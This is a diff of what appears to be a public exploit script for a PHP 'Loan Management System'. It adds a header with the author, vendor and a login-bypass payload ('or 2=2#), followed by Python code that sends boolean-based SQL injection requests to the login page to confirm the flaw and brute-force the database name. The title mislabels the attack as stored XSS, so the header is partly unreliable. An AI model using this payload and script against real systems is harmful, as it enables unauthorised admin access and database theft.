@@ -1,3 +1,17 @@
+# Exploit Title: Loan Management System - Stored XSS on several parameters
+# Date: 28/07/2022
+# Exploit Author: saitamang
+# Vendor Homepage: sourcecodester
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/LMS.zip
+# Version: 1.0
+# Tested on: Centos 7 apache2 + MySQL
+
+# The attack vector for the SQL Injection happened at the login page. The login can be bypass using the boolean payload below to gain access as Admin as the highest privileges.
+
+# Payload --> 'or 2=2#
+
+# The python script to get the database name from SQL Injection Vulnerability can be execute below.
+
 import requests, string, sys, warnings, time, concurrent.futures
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 warnings.simplefilter('ignore',InsecureRequestWarning)
@@ -31,21 +45,21 @@ def check_injection():
         if i==0:
             data = {'username': test_query0,'password':password, 'login':''}
             response = req.post(target, data=data)
-            if response.text=="success":
+            if response.text=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
                 result = response.text
             else:
                 pass
         if i==1:
             data = {'username': test_query1,'password':password, 'login':''}
             response = req.post(target, data=data)
-            if response.text=="success":
+            if response.text=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
                 result = response.text
             else:
                 pass
     if result=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
-        print("[##] SQLI Boolean-Based Present at password field :)")
+        print("[##] SQLI Boolean-Based Present at username field :)")
     else:
-        print("[##] No SQLI :)")
+        print("[##] No SQLI :(")
 
 def brute(dbname,password):
     target = "http://%s/LMS/login.php" %ip
